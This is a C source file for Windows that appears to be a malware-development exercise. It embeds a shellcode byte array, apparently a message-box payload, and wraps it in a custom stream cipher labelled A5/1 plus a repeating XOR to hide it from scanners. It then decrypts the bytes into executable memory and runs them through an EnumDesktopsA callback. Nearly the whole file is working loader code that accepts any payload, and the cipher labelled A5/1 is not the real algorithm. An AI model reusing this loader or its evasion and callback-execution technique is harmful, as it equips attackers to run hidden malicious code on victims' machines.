#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROL(x, y) (((x) << (y)) | ((x) >> (32 - (y))))
#define A5_STEP(x, y, z) ((x & y) ^ (x & z) ^ (y & z))

void a5_1_encrypt(unsigned char *key, int key_len, unsigned char *msg, int msg_len, unsigned char *out) {
  unsigned int R1 = 0, R2 = 0, R3 = 0;
  for (int i = 0; i < 64; i++) {
    int feedback = ((key[i % key_len] >> (i / 8)) & 1) ^ ((R1 >> 18) & 1) ^ ((R2 >> 21) & 1) ^ ((R3 >> 22) & 1);
    R1 = (R1 << 1) | feedback;
    R2 = (R2 << 1) | ((R1 >> 8) & 1);
    R3 = (R3 << 1) | ((R2 >> 10) & 1);
  }

  for (int i = 0; i < msg_len; i++) {
    int feedback = A5_STEP((R1 >> 8) & 1, (R2 >> 10) & 1, (R3 >> 10) & 1);
    unsigned char key_byte = 0;
    for (int j = 0; j < 8; j++) {
      int bit = A5_STEP((R1 >> 18) & 1, (R2 >> 21) & 1, (R3 >> 22) & 1) ^ feedback;
      key_byte |= bit << j;
      R1 = (R1 << 1) | bit;
      R2 = (R2 << 1) | ((R1 >> 8) & 1);
      R3 = (R3 << 1) | ((R2 >> 10) & 1);
    }
    out[i] = msg[i] ^ key_byte;
  }
}

void a5_1_decrypt(unsigned char *key, int key_len, unsigned char *cipher, int cipher_len, unsigned char *out) {
  unsigned int R1 = 0, R2 = 0, R3 = 0;
  for (int i = 0; i < 64; i++) {
    int feedback = ((key[i % key_len] >> (i / 8)) & 1) ^ ((R1 >> 18) & 1) ^ ((R2 >> 21) & 1) ^ ((R3 >> 22) & 1);
    R1 = (R1 << 1) | feedback;
    R2 = (R2 << 1) | ((R1 >> 8) & 1);
    R3 = (R3 << 1) | ((R2 >> 10) & 1);
  }

  for (int i = 0; i < cipher_len; i++) {
    int feedback = A5_STEP((R1 >> 8) & 1, (R2 >> 10) & 1, (R3 >> 10) & 1);
    unsigned char key_byte = 0;
    for (int j = 0; j < 8; j++) {
      int bit = A5_STEP((R1 >> 18) & 1, (R2 >> 21) & 1, (R3 >> 22) & 1) ^ feedback;
      key_byte |= bit << j;
      R1 = (R1 << 1) | bit;
      R2 = (R2 << 1) | ((R1 >> 8) & 1);
      R3 = (R3 << 1) | ((R2 >> 10) & 1);
    }
    out[i] = cipher[i] ^ key_byte;
  }
}

char my_secret_key[] = "ghostwolflabwolf";

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
  int j;
  j = 0;
  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1) j = 0;
    data[i] = data[i] ^ key[j];
    j++;
  }
}

int main() {
  unsigned char key[] = {0x73, 0x6e, 0x6f, 0x77, 0x77, 0x6f, 0x6c, 0x66};
  unsigned char message[] = { 0xfc,0x48,0x81,0xe4,0xf0,0xff,
0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,
0x50,0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,
0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,
0x3e,0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
0xe3,0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,
0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,
0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,
0x49,0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,
0x40,0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,
0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,
0x3e,0x48,0x8d,0x8d,0x2e,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,
0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,
0x48,0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x1f,
0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,
0xff,0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,
0xd5,0x48,0x69,0x2c,0x49,0x20,0x61,0x6d,0x20,0x53,0x6e,0x6f,
0x77,0x77,0x6f,0x6c,0x66,0x00,0x47,0x68,0x6f,0x73,0x74,0x20,
0x57,0x6f,0x6c,0x66,0x20,0x4c,0x61,0x62,0x00,0x75,0x73,0x65,
0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00 };
  int key_len = sizeof(key);

  int shellcode_len = sizeof(message);
  int pad_len = shellcode_len + (8 - shellcode_len % 8) % 8;

  unsigned char padded[pad_len];
  memcpy(padded, message, shellcode_len);
  memset(padded + shellcode_len, 0x90, pad_len - shellcode_len);
  unsigned char encrypted[pad_len];
  a5_1_encrypt(key, key_len, padded, pad_len, encrypted);
  XOR((char *) encrypted, pad_len, my_secret_key, sizeof(my_secret_key));
  unsigned char decrypted[pad_len];
  XOR((char *) encrypted, pad_len, my_secret_key, sizeof(my_secret_key));
  a5_1_decrypt(key, key_len, encrypted, pad_len, decrypted);
  LPVOID mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, decrypted, shellcode_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)NULL);
  return 0;
}
